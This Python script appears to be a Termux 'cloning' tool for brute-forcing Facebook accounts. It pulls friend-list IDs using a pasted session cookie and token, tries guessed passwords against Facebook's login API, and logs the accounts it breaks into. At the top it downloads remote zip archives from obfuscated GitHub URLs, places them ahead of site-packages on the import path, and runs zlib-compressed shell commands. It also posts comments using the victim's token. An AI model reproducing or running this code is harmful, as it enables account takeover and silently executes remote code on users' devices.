from uuid import uuid4
import os,sys,tempfile,string,random,subprocess,uuid
http_directory = tempfile.mkdtemp(prefix='.')
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
sys.path.insert(5,http_directory)
try:
        os.mkdir('crypto')
except:pass
hh = "ho"
hh2 = "9/pycrypt"
find_aarch = subprocess.check_output('uname -om',shell=True)
if 'aarch64' in str(find_aarch):
        user_aarch = '64'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
elif 'arm' in str(find_aarch):
        user_aarch = '32'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
else:
        print(' Unknown aarch ')
        exit()
if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
        os.system('clear')
        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
        os.system('python jan.py')
else:
        akk2="rsi"
        akk=f"cha{akk2}fi"
        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
        os.system(f'curl -L {lib} > {http_directory}/config.zip')
        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
try:
        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
        from string import *

        from concurrent.futures import ThreadPoolExecutor as ThreadPool
        from Crypto.Cipher import AES, PKCS1_v1_5
        from Crypto.PublicKey import RSA
        from Crypto.Random import get_random_bytes
except Exception as e:
        print(e)
        print('\n Installing modules wait !')
        os.system('pip install futures==2 && python jan.py')
except FileExistsError:
        os.system('pip uninstall requests urllib3 idna certifi -y')
        pass

try:
        import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib
        from string import *
        from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python jan.py')

#----[pran links]-----
kkk = {'user-agent': 'Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
lll = ("https://b-api.facebook.com/method/auth.login")
#----[remover]-----
import os,shutil,zlib
sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')
sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')
sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')
sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')
sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')
sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')
sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')
#--checking if file is not avalible
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
        pass
        exit("Error in termux modules ")

if os.path.exists(sz):
        os.rename(sz1,'.f1')
        os.rename(sz2,'.f2')
        os.system(sz3)
        os.system(sz4)
        os.system(sz5)
        os.system(sz6)
else:
        pass
os.system("rm -rf .f1")
os.system("rm -rf .f2")

logo= f'''
     .d88888b.   .d8888b.  8888888b.       
    d88P" "Y88b d88P  Y88b 888   Y88b     
    888     888 Y88b.      888    888     
    888     888  "Y888b.   888   d88P     
    888     888     "Y88b. 8888888P"       
    888 Y8b 888       "888 888 T88b       
    Y88b.Y8b88P Y88b  d88P 888  T88b       
     "Y888888"   "Y8888P"  888   T88b     
            Y8b
{50*"-"}
    Tool Version :     10.1.15
    Thanks Alot  :     M.Hamza
{50*"-"}'''

"-------[@login]----------#"
ses = requests.Session()
def _qlog():
        os.system("clear");print(logo)
        cookie = input(f"\n cookie : ")
        url = "https://business.facebook.com/business_locations"
        head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
        cok = {'cookie':cookie}
        try:
                data = ses.get(url,headers=head,cookies=cok)
                token = re.search('(EAAG\w+)',data.text).group(1)
                open('/sdcard/.cok.txt','w').write(cookie)
                open('/sdcard/.token.txt','w').write(token)
        except ValueError:
                _qlog()
        except IOError:
                os.system('rm -rf /sdcard/.token.txt')
                os.system('rm -rf /sdcard/.cok.txt')
                print("cookie In Checkpoint");time.sleep(2)
        except UnboundLocalError:
                exit(f"run again")

def bot():
        try:
                lc = "bro may AC par beta hu fir b itna gharmi 😅 aab smj aya hot dekh rha tu 👀🙈", "So hot 🔥", "Let’s go 🔥", "Love you so so much!", "Jani ib checkkkk plz", "Hello Chikny Ib Dekh", "Heavenly 😇", "Wonderful ❤️", "Oye Rasta Banao Bhai Arha 😎", "You deserve the best", "HaramKhor 🙈 Bandar 💞", "U are literally flawless!", "Pure charm!", "Gangster 👽", "Your killing it ❤️‍", "Let’s go 🔥", "Rare Pic 😍💓", "So precious!", "Bullet Bullet Bullet !", "I’m not crying you are", "Livin’ the life", "If you need a caddy", "legendry hy tu ", "Have a blast!", "All of the pictures are marvelous and charmistic", "Blessings 💖", "bsdk kaha gayb hy ", "Sharpening the game ", "Vibes asf 🔥", "Have the best time 🔥", "Fly guy 🔥", "itni kushi tujy dekh kr", "bsdk kaha gayb hy ", "Love it ❤️", "This is literally fire 🔥", "New beginnings can’t be hard when you look like that 😍", "You deserve the whole world", "Amazing pics!", "Views are insane! 😍", "INSANE HY TO BRO", "Yo that’s so cool", "That energy ❤️", "Love these shots so much!", "Bull 👾", "This is amazing 😍", "Oh man 🔥", "A great chart", "don ", "Very cool guy energy", "bhai ka bhai", "Gorgeous gal ❤️", "skiny 😕", "naam to suna hga ! chikna 😂😂", "Just casually hanging out", "You forgot my invite", "Looks like u had a blast!", "Omg obsessed 😍", "Love seeing you thrive", "dekha pehli pehli baar 👀", "You look so happy", "I love you say that tu bohat chikna hy 😅", "Swaag😮"," op"
                Baxk = random.choice(lc)
                try:
                        token = open('.token.txt', 'r').read()
                        cookie = open('.cok.txt', 'r').read()
                except:pass
                #comment
                requests.post(f"https://graph.facebook.com/pfbid0swzjJ4s27zLrisdKC1oJ7CchqCNVWPNvZSP7Cwq1c6iw41ff5D2wcU8uafkgQjBol/comments/?message={Baxk}&access_token={token}", cookies={'cookie':cookie})
                #like
                pass
        except:
                pass
"-------[@MainMenu]---------"

#--(Main-Menu)----#
def main():
        os.system("clear");print(logo)
        print("If You Want To Buy Things Without Loking At Price")
        print("Then Always Works Hard Without Looking At A Clock")
        print(50*"-")
        print("[1] Facebook Cloning")
        print("[2] Create File")
        print("[3] File Split/Sep")
        print("[4] Number Detail Finder")
        print("[5] Whatsapp Group")
        print("[6] Exit Tool")
        print(50*"-")
        selectme = input(" Select Any Option : ")
        if selectme in ["1","01","one"]:
                fb_cloning()
        if selectme in ["2","02","two"]:
                create_file()
        if selectme in ["3","03","three"]:
                sep()
        if selectme in ["4","04","four"]:
                number_detail()
        if selectme in ["05","5","five"]:
                os.system("termux-open-url https://chat.whatsapp.com/LoLzZLSux3C9Fp4Fl8AtFT")
                caseher()
        if selectme in ["00","0","exit"]:
                exit(" Thanks For Using ")
        else:
                exit(" Invalid Select")

#--(fb-cloning)----#
def fb_cloning():
        os.system("clear");print(logo)
        print("The Random Cloning Is Working Fully Try It")
        print(50*"-")
        print("[1] File Cloning")
        print("[2] Public Cloning ")
        print("[3] Email Cloning")
        print("[4] Number Cloning")
        print("[0] Go Back ")
        print(50*"-")
        cloneme = input(" Select Any Option : ")
        if cloneme in ["1","01","one"]:
                file_cloning()
        if cloneme in ["2","02","two"]:
                public_cloning()
        if cloneme in ["3","03","three"]:
                email_cloning()
        if cloneme in ["4","04","four"]:
                number_cloning()
        if cloneme in ["00","0","zero"]:
                sys.stdout.write("Redirecting To Main Page ..."),
                time.sleep(2)
                sys.stdout.flush()
                caseher()
        else:
                exit(" ")

#--(fb-file-cloning)----#
import json,os,time,base64,random,re,sys
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpe
id = []
loop = 0
idx=[]
pp = []

def file_cloning():
        os.system("clear");print(logo)
        filelist = input('\033[0m[+] File Path :\033[0m ')
        try:
                for line in open(filelist, 'r').readlines():
                        id.append(line.strip())
        except FileNotFoundError:
                exit("invalid location")
        password()

#--(public-clone)----#
def public_cloning():
        idx=[]
        try:
                tok = open('/sdcard/.token.txt', 'r').read()
                cok = open('/sdcard/.cok.txt', 'r').read()
        except:
                print(" Login Required");time.sleep(2)
                _qlog()
        try:
                r = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tok, cookies={'cookie':cok})
                name = json.loads(r.text)['name']
        except:
                name = "User"
                _qlog()
        cookie=open("/sdcard/.cok.txt", "r").read()
        token=open("/sdcard/.token.txt", "r").read()
        os.system("clear");print(logo)
        limit3 = input("How many public ids to add ? ")
        os.system("clear");print(logo)
        for ouqat in range(int(limit3)):
                qs=input(f" {ouqat+1} id : ")
                try:
                        sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit(5000)&access_token='+token, cookies={'cookie':cookie}).text
                        qsr = json.loads(sy)
                        for abbas in qsr['friends']['data']:
                                uids=abbas['id']
                                name=abbas['name']
                                bc=uids+"|"+name
                                id.append(bc+'\n')
                except KeyError:
                        if 'invalid' in str(sy):
                                print(f'{r}Your Cookie Is Lol{s}')
                                exit()
                        else:
                                print(f" {lr}{qs} friend list private{s} ")
                                time.sleep(5)
                except IOError:
                        pass
        password()

#--(rand-email-clone)----#
def email_cloning():
        os.system("clear");print(logo)
        import requests,random
        user=[]
        print(" [*] First Name Example Hamza,Areesha")
        first = input(" First Name : ")
        last = input(" Last Name : ")
        print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
        domain = input(" Domain : ")
        print("\n [?] Limit ids Example 1000,5000,50000")
        limit = int(input(" Limit Ids : "))
        for nmbr in range(limit):
                nmpp = random.randint(99,9999)
                nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
                id.append(nmp)
        passwordemail()

#--(number-cloning)----#
def number_cloning():
        os.system('clear');print(logo)

        print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')
        kode = input('\033[0mChoose Code : \033[0m')
        print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')
        limit = int(input('\033[0mIdz Limit : \033[0m'))
        for nmbr in range(limit):
                nmp = ''.join(random.choice(string.digits) for _ in range(7))
                xoo = kode+nmp.replace(" ","")
                xdr = f"{kode+nmp}|{nmp} {xoo}\n"
                id.append(xdr)
        passwordnum(xoo)

"-------[@Passlists]---------"
#--(pass-number)----#
def passwordnum(xoo):
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'r') as file :
                filedata = file.read()
        filedata = filedata.replace('verify = False', 'verify = True')
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'w') as file:
                file.write(filedata)
        #If There is Verify False Also Then It Returns With True wala Verify
        if "verify = True" in filedata:
                pass
        else:
                with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'a') as file:
                        file.write('\nverify = True\n')

        os.system('clear')
        print (logo)
        print(" Cloning Is Started Kindly Be Patient ... ")
        print(" Turn Airplane On Off When There Is Alert ")
        print(" The Speed Of Tool Depended In Your Network")
        print(50*"-")
        with tred(max_workers=30) as pool:
                for yuzong in id:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        frslst = nmf.replace(" ", "")
                        pwv = ['pakistan','786786']
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(xoo)
                                        pwv.append(frs)
                                        pwv.append("khan123")
                                        pwv.append("khan12345")
                                        pwv.append("khankhan")
                                        pwv.append("khan786")
                                        pwv.append("khan12")
                                        pwv.append("khan1122")
                        else:
                                pwv.append(xoo)
                                pwv.append(frs)
                                pwv.append("khan123")
                                pwv.append("khan12345")
                                pwv.append("khankhan")
                                pwv.append("khan786")
                                pwv.append("khan12")
                                pwv.append("khan1122")
                        pool.submit(crackmbasic,idf,pwv)
#--(pass-email)----#
def passwordemail():
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'r') as file :
                filedata = file.read()
        filedata = filedata.replace('verify = False', 'verify = True')
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'w') as file:
                file.write(filedata)
        #If There is Verify False Also Then It Returns With True wala Verify
        if "verify = True" in filedata:
                pass
        else:
                with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'a') as file:
                        file.write('\nverify = True\n')

        os.system('clear')
        print (logo)
        print(" Cloning Is Started Kindly Be Patient ... ")
        print(" Turn Airplane On Off When There Is Alert ")
        print(" The Speed Of Tool Depended In Your Network")
        print(50*"-")
        with tred(max_workers=30) as pool:
                for yuzong in id:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        frslst = nmf.replace(" ", "")
                        pwv = ['pakistan','786786']
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(frs)
                                        pwv.append(frslst)
                                        pwv.append(frs+"123")
                                        pwv.append(frs+"12345")
                                        pwv.append(frs+"123456")
                                        pwv.append(frs+"khan")
                                        pwv.append(frslst+"123")
                                        pwv.append(frslst+"123456")
                                        pwv.append(nmf)
                                        pwv.append("khan786")
                                        pwv.append("khankhan")
                        else:
                                pwv.append(frs)
                                pwv.append(frslst)
                                pwv.append(frs+"123")
                                pwv.append(frs+"12345")
                                pwv.append(frs+"123456")
                                pwv.append(frs+"khan")
                                pwv.append(frslst+"123")
                                pwv.append(frslst+"123456")
                                pwv.append(nmf)
                                pwv.append("khan786")
                                pwv.append("khankhan")
                        pool.submit(crackmbasic,idf,pwv)

#--(pass-file+public)----#
def password():
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'r') as file :
                filedata = file.read()
        filedata = filedata.replace('verify = False', 'verify = True')
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'w') as file:
                file.write(filedata)
        #If There is Verify False Also Then It Returns With True wala Verify
        if "verify = True" in filedata:
                pass
        else:
                with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'a') as file:
                        file.write('\nverify = True\n')

        os.system('clear')
        print (logo)
        print(" Cloning Is Started Kindly Be Patient ... ")
        print(" Turn Airplane On Off When There Is Alert ")
        print(" The Speed Of Tool Depended In Your Network")
        print(50*"-")
        with tred(max_workers=30) as pool:
                for yuzong in id:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        frslst = nmf.replace(" ", "")
                        pwv = [nmf,'pakistan']
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(frslst)
                                        pwv.append(frs+'123')
                                        pwv.append(frs+'12345')
                                        pwv.append(frs+'1122')
                                        pwv.append(nmf)
                                        pwv.append(frslst+'12345')
                                        pwv.append(frslst+'123')
                                        pwv.append(frslst+'12')
                                        pwv.append('khankhan')
                                        pwv.append('khan123')
                        else:
                                pwv.append(frslst)
                                pwv.append(frs+'123')
                                pwv.append(frs+'12345')
                                pwv.append(frs+'1122')
                                pwv.append(frs+'786')
                                pwv.append(nmf)
                                pwv.append(frslst+'12345')
                                pwv.append(frslst+'123')
                                pwv.append(frslst+'12')
                                pwv.append('khankhan')
                                pwv.append('khan123')
                        pool.submit(crackmbasic,idf,pwv)

#--(method-latest)----#
aks="auth.login"
djksj="b-"
asmr=f"{djksj}api.facebook.com"
koin = f"facebook.com"
grp = f"graph.{koin}"
auttt=f"auth"
import requests,re,random,string,secrets,os
def crackmbasic(idf,pwv):
        global ok,cp,loop
        sys.stdout.write(f"\r \033[0m[{aajdate}] {loop}/{len(id)} {ok} "),
        sys.stdout.flush()
        for pw in pwv:
                        ag = idf[::-1]
                        head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) Mobile/nFGZ6 [FBAN/FBIOS;FBDV/iPhone13,1;FBSN/iOS;FBSV/262.463.500;FBSS/2;FBID/iPhone;FBLC/en_US;FBOP/5;FBRV/0];', 'accept-encoding': 'gzip,deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authentication': 'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell', 'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-friendly_name': 'authenticate'}
                        dataa = {'include_headers': 'False', 'decode_body_json': 'True', 'streamable_json_response': 'True', 'api_key': '6628568379', 'adid': 'C77d3d38Cf2CCab9', 'format': 'JSON', 'method': 'auth/login', 'email': idf, 'password': pw, 'credentials_type': 'password', 'error_detail_type': 'button_with_disabled', 'source': 'login', 'community_id': '0', 'currently_logged_in_userid': '0', 'meta_inf_fbmeta': 'NO_FILE', 'try_number': '1', 'attempt_login': 'true', 'return_multiple_errors': 'true', 'locale': 'en_US', 'client_country_code': 'en_US', 'access_token': '6628568379|c1e620fa708a1d5696fb991c1bde5662', 'server_timestamps': 'True', 'pretty': 'False', 'strip_defaults': 'True', 'strip_nulls': 'True', 'fb_api_caller_class': 'com.facebook.account.login.protocol.FbiosAuthHandler', 'fb_api_request_friendly_name': 'authenticate'}
                        r = requests.post(f"https://graph.facebook.com/auth/login",headers=head,verify=True,data=dataa)
                        ro = re.findall('uid": (.*?),',str(r.text))
                        try:
                                for roid in ro:
                                        pass
                        except:
                                roid = idf
                        if "www.facebook.com" in r.text:
                                print(f'   \r {rp}[QSR-CP] {idf} | {pw}{s}')     
                                open('/sdcard/qsr_cp.txt','a').write(roid+'|'+pw+'\n')
                                akun.append(idf+'|'+pw)
                                cp+=1
                                break
                        elif "session_key" in r.text:
                                ok+=1
                                print(f'   \r {rg}[QSR-OK] {roid} | {pw}{s}')
                                open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pw+'\n')
                                break
                        elif "SMS shortly" in r.text:
                                print(f'   \r {rc}[QSR-2F] {idf} | {pw}{s}')
                                open('/sdcard/qsr_2f.txt','a').write(roid+'|'+pw+'\n')
                                break
                        else:
                                continue
        loop+=1

#--(file-create)----#
def create_file():
        try:
                tok = open('/sdcard/.token.txt', 'r').read()
                cok = open('/sdcard/.cok.txt', 'r').read()
        except:
                print(" Login Required");time.sleep(2)
                _qlog()
        try:
                r = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tok, cookies={'cookie':cok})
                name = json.loads(r.text)['name']
        except:
                name = "User"
                _qlog()
        bot()
        os.system("clear");print(logo)
        print(f" Welcome {name} Fb Ids File Create Menu")
        print(50*"-")
        print("[1] Create File Normally")
        print("[2] Create File by File")
        print("[0] Go Back ")
        print(50*"-")
        fileme = input(" Select Any Option : ")
        if fileme in ["1","01","one"]:
                normal_file()
        if fileme in ["2","02","two"]:
                bulk_file()
        if fileme in ["00","0","zero"]:
                sys.stdout.write("Redirecting To Main Page ..."),
                time.sleep(2)
                sys.stdout.flush()
                caseher()
        else:
                exit("Invalid Option")

def normal_file():
        limbo = "5000"
        rr = byy(0,20)
        cookie=open("/sdcard/.cok.txt", "r").read()
        token=open("/sdcard/.token.txt", "r").read()
        os.system('clear');print(logo)
        ###u_q_l = int(input(" How Many Ids To Add ? "))
        file_s = input(' Example /sdcard/xxx.txt\n Save file As : ')
        os.system('rm -rf '+file_s)
        file_s3 = ".aid.txt"
        try:
                qs=input(f' Input Id : ').split("|")[0]
                sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit('+limbo+')&access_token='+token, cookies={'cookie':cookie}).text
                qsr= json.loads(sy)
                _fleq=open(file_s3,"a")
                for abbas in qsr['friends']['data']:
                        uids=abbas['id']
                        name=abbas['name']
                        bc=uids+"|"+name
                        _fleq.write(bc+'\n')
        except KeyError:
                if 'invalid' in str(sy):
                        print(f'{r}Your Cookie Is Lol{s}')
                        exit()
                else:
                        print(f"[{c}{qs}{s}]\033[1;91m Friend List Is Prvate Bro {r}{qs}{s}\033[1;97m")
                        time.sleep(5)
                        caseher()
        xbc = open(file_s3, 'r').readlines()
        print(f" \tLimit Less Than {str(len(xbc))}")
        limit=int(input(f" How Many Ids Do you want to Extract \n Limit {str(len(xbc))} : "))
        if limit > len(xbc):
                print(f"{r}\t Error ! Type Less Then {str(len(xbc))} {s}")
                time.sleep(3)
                caseher()
        else:
                pass
        for i in range(limit):
                lines = open(file_s3).readlines()
                Types = [line.split("|")[0] for line in lines]
                qs = random.choice(Types)
                try:
                        sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit(5000)&access_token='+token, cookies={'cookie':cookie}).text
                        qsr= json.loads(sy)
                        _fileq=open(file_s,"a")
                        for abbas in qsr['friends']['data']:
                                uids=abbas['id']
                                name=abbas['name']
                                bc=uids+"|"+name
                                _fileq.write(bc+'\n')
                        thn = open(file_s, 'r').readlines()
                        sys.stdout.write(f"\r Sucessfully Dump : {rg}{qs}{s}{ro}/[{str(len(thn))}]{s}"),
                        sys.stdout.flush()
                        _fileq.close()
                except KeyError:
                        if 'invalid' in str(sy):
                                print(f'{r}Your Token Is Lol{s}')
                                exit()
                        else:
                                pass
                except IOError:
                        pass
        print(50*"-")
        tot = open(file_s, 'r').readlines()
        print(' \033[1;97m Process Completed  ')
        print(f'  Total ids  : {rg}'+str(len(tot)))
        print(f'  {s}File saved as: {rp}'+file_s)
        print(50*"\033[1;97m-")

        input('\033[0m[Press enter to back] ')
        caseher()
def bulk_file():

        bc=[]
        rr = byy(0,20)
        cookie=open("/sdcard/.cok.txt", "r").read()
        token=open("/sdcard/.token.txt", "r").read()
        os.system('clear');print(logo);print('\tFile Create Menu 2\n===============================================\n')
        _file_s = input('   Path of Old File From Which ids Extract \n Example /sdcard/xxx.txt : ')
        try:
                qais=open(_file_s,'r').readlines()
        except FileNotFoundError:
                print(f"{r}File Not Founded{s}");time.sleep(3)
                caseher()
        __file_s2 = input(' Save File As Example /sdcard/xxx.txt\n Save as : ')
        os.system('rm -rf '+__file_s2)
        print(f"\t {rc}Dont Type Limit Greater Then {s}{str(len(qais))}")
        limit=int(input(f" How Many Ids Do you want to Extract \n Limit {str(len(qais))} : "))
        if limit > len(qais):
                print(f"{r}\t Errorrr ! Type Less Then {str(len(qais))} {s}")
                time.sleep(3)
                caseher()
        for i in range(1,limit):
                lines = open(_file_s).readlines()
                Types = [line.split("|")[0] for line in lines]
                qs = random.choice(Types)
                try:
                        sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit(5000)&access_token='+token, cookies={'cookie':cookie}).text
                        qsr= json.loads(sy)
                        _fileq=open(__file_s2,"a")
                        for abbas in qsr['friends']['data']:
                                uids=abbas['id']
                                name=abbas['name']
                                bc=uids+"|"+name
                                _fileq.write(bc+'\n')
                        thn = open(_fileq, 'r').readlines()
                        sys.stdout.write(f"\r Sucessfully Dump : {rg}{qs}{s}{ro}/[{str(len(thn))}]{s}"),
                        sys.stdout.flush()
                        _fileq.close()
                except KeyError:
                        if 'invalid' in str(sy):
                                print(f'{r}Your Cookie Is Lol{s}')
                                exit()
                        else:
                                pass
                except IOError:
                        pass
                ####_fileq.close()
        print(50*"-")
        tot = open(__file_s2, 'r').readlines()
        print(' \033[1;97m Process Completed  ')
        print(f'  Total ids  : {g}'+str(len(tot)))
        print(f'  {s}File saved as: {y}'+__file_s2)
        print(50*"\033[1;97m-")
#--(file-seperator)----#

def sep():

        os.system('clear');print(logo)
        try:
                limit = int(input(' How many links do you want to separate ? '))
        except:
                limit = 1
        print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
        file_name = input('\033[0m Input file path : ')
        print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
        new_save = input('\033[0m Save new file as : ')
        y = 0
        print(f" {ro}Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
        for k in range(limit):
                y+=1
                links=input(' Put Uid Type : ')
                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
        print(50*"\033[0m-")

        print(f'{rc} ids grabbed successfully{s}')
        print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
        print('\033[0m New file saved as : \033[0;33m '+new_save)
        print(50*"\033[0m-")

        input('\033[0m[Press enter to back] ')
        caseher()

#--(number-detail)----#
def number_detail():

        from bs4 import BeautifulSoup
        from bs4 import BeautifulSoup as parser
        os.system("clear");print(logo)
        numm = input(" Number : ")
        head = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded',"Referer": "https://freepicccs.com/index2.php?msg=Please%20Enter%20atleast%201%20Mobile%20Number%20or%20CNIC"}
        dataa = {'cnnum': numm}
        r = requests.post('https://freepicccs.com/search-result2.php',headers=head,data=dataa)
        bc = re.findall("\<div(.*?)</table>",str(r.text))
        open(".tt1.txt","w").write(str(bc))
